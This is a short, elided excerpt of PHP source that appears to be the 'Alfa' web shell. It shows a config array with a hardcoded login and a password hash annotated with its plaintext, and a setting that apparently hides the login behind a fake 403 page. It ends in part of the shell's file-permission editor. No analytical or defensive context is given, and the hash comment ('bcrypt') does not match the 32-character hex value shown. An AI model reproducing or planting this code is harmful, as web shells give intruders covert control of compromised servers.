...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'cd51f4f37ec0a499769e87031a1ca5e3',//bcrypt(bong.vin)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '0',
				...
				<div class='perm-table-holder'>
					<table>
					   <tbody>
					      ...
					      <tr>
					         <td>Write</td><td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
